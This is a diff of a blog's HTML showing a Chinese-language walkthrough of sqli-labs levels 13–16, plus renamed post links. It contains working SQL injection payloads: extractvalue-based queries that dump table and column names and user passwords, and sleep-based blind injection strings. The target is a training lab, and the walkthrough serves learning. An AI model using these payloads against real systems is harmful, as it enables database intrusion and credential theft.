@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/11/10/sqli-lab-less13/">sqli-lab-less13</a>
+      <a class="p-name article-title" href="/2022/11/10/sqli-lab-less13/">sqli-lab-less13-16</a>
     </h1>
   
 
@@ -124,10 +124,28 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e))#</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),32,31),0x7e))#</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(id,username,password) from users),32,31),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>十四关同理，<br>只把<code>&#39;)</code>改成<code>&quot;</code>即可。</p>
+<hr>
+<p>十五关 时间盲注。<br>老规矩，找闭合。<br>一个单引号，成功登入。<br>大体和前面的时间盲注差不多。</p>
+<p>验证时间盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or sleep(5)# </span><br></pre></td></tr></table></figure>
+<p>注意这里是or 不是and<br>其他和前面时间盲注一模一样。</p>
+<p><strong>再给第五关一个小补充：</strong><br>我们第五关用的是ascii码来测，优点是可以用二分法，快速定位；缺点是不会背ascii码。<br>我们可以直接爆字母：<br>eg像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)#</span><br></pre></td></tr></table></figure>
+<p>left后面的1的意思是：从开始起一个。<br>同时的，我们也可以查询多位<br>eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or if(left((select username from users order by id limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>对比下查ascii码的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or if(ascii(substr(database(),1,1))=115,sleep(2),0)#</span><br></pre></td></tr></table></figure>
+<hr>
+<p>第十六关，<br>把第十五关的<code>&#39;</code>改成<code>&quot;)</code>就好</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/10/sqli-lab-less13/" data-id="clacgtll8000hko8071uo2ujo" data-title="sqli-lab-less13" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/10/sqli-lab-less13/" data-id="clacgtll8000hko8071uo2ujo" data-title="sqli-lab-less13-16" class="article-share-link">Share</a>
       
       
       
@@ -139,9 +157,9 @@
 
 
   
-    <article id="post-sqli-lab-less11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-sqli-lab-less11-12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/11/07/sqli-lab-less11/" class="article-date">
+    <a href="/2022/11/07/sqli-lab-less11-12/" class="article-date">
   <time class="dt-published" datetime="2022-11-07T13:48:34.000Z" itemprop="datePublished">2022-11-07</time>
 </a>
     
@@ -153,7 +171,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/11/07/sqli-lab-less11/">sqli-lab-less11</a>
+      <a class="p-name article-title" href="/2022/11/07/sqli-lab-less11-12/">sqli-lab-less11-12</a>
     </h1>
   
 
@@ -187,7 +205,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/07/sqli-lab-less11/" data-id="clacgtll9000lko809m3p8ah1" data-title="sqli-lab-less11" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/07/sqli-lab-less11-12/" data-id="claclucpz0000to80e1b67ghz" data-title="sqli-lab-less11-12" class="article-share-link">Share</a>
       
       
       
@@ -256,9 +274,9 @@
 
 
   
-    <article id="post-sqli-labs-less7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-sqli-labs-less7-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/11/05/sqli-labs-less7/" class="article-date">
+    <a href="/2022/11/05/sqli-labs-less7-10/" class="article-date">
   <time class="dt-published" datetime="2022-11-05T04:26:08.000Z" itemprop="datePublished">2022-11-05</time>
 </a>
     
@@ -270,7 +288,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/11/05/sqli-labs-less7/">sqli-labs-less7-10</a>
+      <a class="p-name article-title" href="/2022/11/05/sqli-labs-less7-10/">sqli-labs-less7-10</a>
     </h1>
   
 
@@ -301,7 +319,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/05/sqli-labs-less7/" data-id="clacgtll8000iko80ag89760z" data-title="sqli-labs-less7-10" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/05/sqli-labs-less7-10/" data-id="claclucq40001to809zyv3uzj" data-title="sqli-labs-less7-10" class="article-share-link">Share</a>
       
       
       
@@ -313,9 +331,9 @@
 
 
   
-    <article id="post-sqli-labs-less-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-sqli-labs-less-5-6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/10/28/sqli-labs-less-5/" class="article-date">
+    <a href="/2022/10/28/sqli-labs-less-5-6/" class="article-date">
   <time class="dt-published" datetime="2022-10-28T15:09:09.000Z" itemprop="datePublished">2022-10-28</time>
 </a>
     
@@ -327,7 +345,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/10/28/sqli-labs-less-5/">sqli-labs-less5-6</a>
+      <a class="p-name article-title" href="/2022/10/28/sqli-labs-less-5-6/">sqli-labs-less5-6</a>
     </h1>
   
 
@@ -429,7 +447,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/10/28/sqli-labs-less-5/" data-id="clacgtlle000qko801n8v1mbd" data-title="sqli-labs-less5-6" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/10/28/sqli-labs-less-5-6/" data-id="claclucq50002to804l5c4td0" data-title="sqli-labs-less5-6" class="article-share-link">Share</a>
       
       
       
@@ -721,11 +739,11 @@
       <ul>
         
           <li>
-            <a href="/2022/11/10/sqli-lab-less13/">sqli-lab-less13</a>
+            <a href="/2022/11/10/sqli-lab-less13/">sqli-lab-less13-16</a>
           </li>
         
           <li>
-            <a href="/2022/11/07/sqli-lab-less11/">sqli-lab-less11</a>
+            <a href="/2022/11/07/sqli-lab-less11-12/">sqli-lab-less11-12</a>
           </li>
         
           <li>
@@ -733,11 +751,11 @@
           </li>
         
           <li>
-            <a href="/2022/11/05/sqli-labs-less7/">sqli-labs-less7-10</a>
+            <a href="/2022/11/05/sqli-labs-less7-10/">sqli-labs-less7-10</a>
           </li>
         
           <li>
-            <a href="/2022/10/28/sqli-labs-less-5/">sqli-labs-less5-6</a>
+            <a href="/2022/10/28/sqli-labs-less-5-6/">sqli-labs-less5-6</a>
           </li>
         
       </ul>
